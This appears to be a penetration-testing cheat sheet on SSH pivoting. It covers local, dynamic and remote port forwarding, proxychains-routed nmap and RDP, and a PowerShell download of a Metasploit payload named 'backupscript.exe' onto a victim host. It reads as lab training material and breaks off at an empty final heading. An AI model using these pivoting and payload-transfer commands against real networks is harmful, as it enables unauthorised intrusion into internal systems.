---
description: This is more of a cheat sheet for commands.
---

# SSH

## Local Port Forwarding

### Local Port Forwarding

```bash
 ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

Opens a listener on local port 1234 (our machine) and sends all traffic to remote port 3306 (10.129.202.64).

### Forwarding multiple ports

```bash
 ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

This SSH command connects to a remote machine and sets up two local port forwards:

1. Local port 1234 forwards to port 3306 on the remote machine (typically MySQL).
2. Local port 8080 forwards to port 80 on the remote machine (typically HTTP).

### Local Port Forwarding Example

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-03 194415.png" alt=""><figcaption></figcaption></figure>

```bash
jumphost@ubuntu ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Opens a listener on port 4455 (CONFULENCE01 Jump Host) and forwards all traffic through 10.4.50.215 to 172.16.50.217:445. (PGDATABASE01).

_<mark style="color:red;">**NOTE**</mark>_: **-N** flag is means execute no remote commands. When we use this, we will not get any response back.

## Dynamic Port Forwarding - Tunneling over SOCKS proxy

Local port forwarding is limited to one socket per SSH connection. OpenSSH allows for dynamic port forwarding. From a single listening port, packets can be forwarded to any socket that the server can route to. **This works because the listening port creates a SOCKS proxy.**

### D_**ynamic Port Forwarding from Attack Host:**_

```shell-session
attacker@kali$ ssh -D 9050 ubuntu@10.129.202.64
```

_<mark style="color:red;">**NOTE:**</mark>_ The **-D** flag enables dynamic port forwarding & ssh acts as a SOCKS server.

```bash
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

### D_**ynamic Port Forwarding From Jump Host:**_

```shell-session
jump-host@ubuntu$ ssh -D 9050 ubuntu@172.167.32.11
```

```bash
┌──(kali㉿kali)-[~]
└─$ tail -f /etc/proxychains4.conf
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5  192.168.198.63  9050 # Ip address of jump host

```

### Using tools with Proxychains:

_**Nmap:**_&#x20;

This is my preferred nmap command to run. (172.16.50.217 is in internal network)

```
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

_**xfreerdp:**_

```bash
kali@kali proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Remote Port Forwarding

Also known as **Reverse Port Forwarding**. In real world scenarios it is likely we'll encounter a firewall that heavily restricts inbound connections. Outbound connections however, are less likely to be blocked.&#x20;

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-04 153523.png" alt=""><figcaption></figcaption></figure>

### Start SSH Service

```shell-session
kali:~$ sudo systemctl start ssh
```

### Connect back to Kali Host

The below command opens a port on localhost 2345 on our kali machine. All traffic is forwarded through the jump host to 10.4.50.215:5432.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>victim@jump-host$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
</strong></code></pre>

### Verifying Port Forward

As we can see, our kali box is listening on 127.0.0.1 2345

```
kali@kali$ ss -ntlpu                     
Netid            State             Recv-Q            Send-Q                       Local Address:Port                          Peer Address:Port            Process            
udp              UNCONN            0                 0                                  0.0.0.0:52704                              0.0.0.0:*                                  
tcp              LISTEN            0                 128                              127.0.0.1:2345                               0.0.0.0:*                                  
tcp              LISTEN            0                 128                                0.0.0.0:22                                 0.0.0.0:*                                  
tcp              LISTEN            0                 128                                   [::]:22                                    [::]:*      
```

### Transferring Metasploit Binary to Victim (on internal network).

We may need to transfer a binary to a machine we have access to.

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Remote Dynamic Port Forwarding

Dynamic Remote Port Forwarding
